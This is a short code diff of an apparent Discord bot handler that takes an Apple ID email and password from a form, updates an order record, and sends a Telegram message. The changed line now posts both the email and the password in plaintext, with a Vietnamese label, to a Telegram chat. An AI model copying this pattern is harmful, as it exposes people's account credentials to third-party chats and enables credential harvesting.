@@ -8,7 +8,7 @@ export async function SendAppleIDModalSubmit(
   const email = interaction.fields.getTextInputValue("email");
   const password = interaction.fields.getTextInputValue("password");
   const modalId = interaction.customId;
-  const messageId = modalId.split("|")[1];
+  const messageId = modalId.split("|")[1] as unknown as Number;
   const orderId = modalId.split("|")[2];
 
   const dbOrder = await prisma.order.update({
@@ -21,14 +21,10 @@ export async function SendAppleIDModalSubmit(
     },
     select: { data: true },
   });
-  console.log("🚀 ~ dbOrder:", dbOrder);
-  // await telegramBot.telegram.editMessageText(
-  //     process.env.TELEGRAM_CHAT_ID, email,
 
-  // )
   await telegramBot.telegram.sendMessage(
     process.env.TELEGRAM_CHAT_ID,
-    `Đã chỉnh sửa tin nhắn`,
+    `Email và mật khẩu mới\nEmail: ${email}\nMật khẩu: ${password}`,
     {
       reply_parameters: {
         message_id: Number(messageId),
